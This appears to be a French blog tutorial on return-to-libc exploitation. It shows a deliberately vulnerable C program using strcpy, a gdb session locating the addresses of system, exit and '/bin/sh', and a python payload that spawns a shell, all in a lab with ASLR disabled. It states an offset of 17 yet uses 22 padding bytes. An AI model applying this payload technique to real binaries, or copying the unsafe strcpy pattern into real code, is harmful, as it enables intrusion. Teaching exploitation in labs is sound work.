---
title: "Technique de la retour à la libc"
description: sam.png
tags: ["Dans cet article je vous présente comment exploiter une vulnérabilité pour bypass le système NX avec la technique de la retourne à la libc."]
---

![forthebadge made-with-python](https://media.giphy.com/media/xT9IgG50Fb7Mi0prBC/giphy.gif)

Prérequis :
- Avoir les bases en `pwn` de comprendre et comment attaquer un buffer overflow basique.
- Et d'un ordinateur, eh eh !

Aujourd'hui je souhaite vous présentez un article pour une nouvelle technique de `Buffer Overflow`. Une technique relativement amusante et très simple, êtes-vous intéressez ? Si c'est le cas, allons-y !

# C'est quoi la technique de la retourne à la libc ?

Ce que nous avons vue la dernière fois en rapport avec les `Buffer Overflow` pour exécuter un `shellcode`,  il fallait que la `pile/stack` soit exécutable. 

    root@0xEX75:~# readelf -lW ./testing |grep GNU_STACK
    GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RWE 0x10
    
Le `R` désigne tout simplement que la pile est en lecture et la lettre `W` correspond concrètement à l'écriture sur la pile et enfin la lettre `E` correspond à la pile exécutable, et c'est grâce à ce système que nous pouvons exécuter un shellcode car c'est le processeur qui exécute notre shellcode.

![forthebadge made-with-python](https://2.bp.blogspot.com/-UPzV6M_ZsK8/W3B5kWiwYII/AAAAAAAAAeE/L1izLVAJGbwfh52XG4HjMtPDDMXC-bLqACLcBGAs/s1600/ret2libc.png)

Dans des cas assez spécifique, la pile n'est pas exécutable donc c'est presque impossible de faire exécuter un shellcode au programme pour `pop` un shell par exemple. Donc les experts ont trouver une solution qui se nomme la technique de `retourne à la libc`, qui permet d'utiliser des fonctions de la `libc`, comme par exemple la fonction `system();` pour ensuite l'utiliser contre le programme.

# Pratique exploitation !

(Pour cette partie, nous désactiverons l'`ASLR`, car la technique de retourne à la libc fonctionne uniquement si la pile n'est pas exécutable et que l'ASLR n'est pas activé.)

Voici un petit script en C qui ne fait pas grand chose :

    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>

    void name(char*);

    void name(char *f)
    {
        char firstname[10];
        strcpy(firstname, f);
        printf("Your name : %s\n", firstname);
    }

    int main(int argc, char *argv[])
    {
        if(argc != 2)
        {
            exit(0);
        }
        name(argv[1]);
        return 0;
    }
    
Un programme basique qui ne fait pas grand chose, mais la vulnérabilité se trouve au niveau de la fonction `strcpy();`. Je suppose que vous savez que les fonctions comme `strcpy();`, `strcat();` etc.. ne sont pas du tout sécurisées donc il existe un système qui se nomme `FORTIFY_SOURCE` qui permet de remplacer les fonctions par des fonctions beaucoup plus sécurisées.

Ensuite, une petite compilation est nécessaire :

    root@0xEX75:~/libc# gcc -m32 -fno-stack-protector libc.c -o libc
    root@0xEX75:~/libc# readelf -lW libc|grep GNU_STACK
    GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x10
    
(Le flag `E` n'est pas là, donc la pile n'est plus du tout exécutable.). Si nous essayons d'exécuter le programme après la compilation, cela fonctionne, mais dans la mémoire il se passe des choses.

    root@0xEX75:~/libc# ./libc $(python -c 'print "A"*17')
    Your name : AAAAAAAAAAAAAAAAA
    root@0xEX75:~/libc# ./libc $(python -c 'print "A"*18')
    Your name : AAAAAAAAAAAAAAAAAA
    segmentation fault (core dumped)
    
Nous pouvons aperçevoir que le programme plante après 17 caractères, donc l'`OFFSET` correspond exactement à 17 caractères, si nous effectuons un dépassement, la sauvegarde `sEIP` sera complètement écrasé et le programme plantera automatiquement.

Nous allons lancer `GDB` (GNU Debugger), et nous allons chercher l'adresse de la fonction `system();`, `exit();` et finalement une chaîne comme `/bin/sh` qui nous permettra de lancer cette commande en particulier.

    root@0xEX75:~/libc# gdb ./libc
    GNU gdb (Debian 8.3.1-1) 8.3.1
    Copyright (C) 2019 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    <http://www.gnu.org/software/gdb/bugs/>.
    Find the GDB manual and other documentation resources online at:
        <http://www.gnu.org/software/gdb/documentation/>.

    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    Reading symbols from ./libc...
    (No debugging symbols found in ./libc)
    gdb-peda$ r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Starting program: /root/libc/libc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Your name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    EAX: 0x54 ('T')
    EBX: 0x41414141 ('AAAA')
    ECX: 0x7fffffac 
    EDX: 0xf7fae010 --> 0x0 
    ESI: 0xf7fac000 --> 0x1d6d6c 
    EDI: 0xf7fac000 --> 0x1d6d6c 
    EBP: 0x41414141 ('AAAA')
    ESP: 0xffffd290 ('A' <repeats 45 times>)
    EIP: 0x41414141 ('AAAA')
    EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0x41414141
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd290 ('A' <repeats 45 times>)
    0004| 0xffffd294 ('A' <repeats 41 times>)
    0008| 0xffffd298 ('A' <repeats 37 times>)
    0012| 0xffffd29c ('A' <repeats 33 times>)
    0016| 0xffffd2a0 ('A' <repeats 29 times>)
    0020| 0xffffd2a4 ('A' <repeats 25 times>)
    0024| 0xffffd2a8 ('A' <repeats 21 times>)
    0028| 0xffffd2ac ('A' <repeats 17 times>)
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0x41414141 in ?? ()
    gdb-peda$ p system
    $1 = {<text variable, no debug info>} 0xf7e17660 <system> # ADDRESS FUNCTION SYSTEM
    gdb-peda$ p exit
    $2 = {<text variable, no debug info>} 0xf7e0a6f0 <exit> # ADDRESS FUNCTION EXIT
    gdb-peda$ searchmem "/bin/sh"
    Searching for '/bin/sh' in: None ranges
    Found 1 results, display max 1 items:
    libc : 0xf7f54f68 ("/bin/sh") # ADDRESS /BIN/SH
    
Donc, nous avons réussis à capturer les adresses de `system();`, `exit()` et finalement de la chaîne "`/bin/sh"`.

- `system();` : `0xf7e17660`
- `exit();`   : `0xf7e0a6f0`
- `/bin/sh`   : `0xf7f54f68`

![forthebadge made-with-python](https://fundacion-sadosky.github.io/guia-escritura-exploits/esoteric/imagenes/ret-2-libc.png)

Il suffit maintenant d'utiliser les adresses que nous avons capturer contre le programme afin de `pop` un shell. Si nous avons pris la fonction `exit()`, c'est pour simplement quitter le shell de manière correct, car si nous mettons pas la fonction `exit();`, et que nous quittons le shell, il nous affichera un beau `segfault`, donc pas très beau à voir, vous n'êtes pas obliger de le mettre n'empêche, c'est totalement facultatif.

    root@0XEX75:~/libc# ./libc $(python -c 'print "A"*22 + "\x60\x76\xe1\xf7" + "\xf0\xa6\xe0\xf7" + "\x68\x4f\xf5\xf7"')
    Your name : AAAAAAAAAAAAAAAAAAAAAA`vhO
    # whoami
    root
    # id
    uid=0(root) gid=0(root) groupes=0(root)

![forthebadge made-with-python](https://media.giphy.com/media/XqXDNFZREKMBq/giphy.gif)

# CONCLUSION !

Voilà, nous arrivons enfin au bout de cet article qui, je l’espère, vous aura plus. J'ai essayer de vous expliquez le fonctionnement de la `technique de la retourne à la libc`, n'hésitez pas à me contacter sur les réseaux sociaux, je suis toujours disponible pour vous répondre.
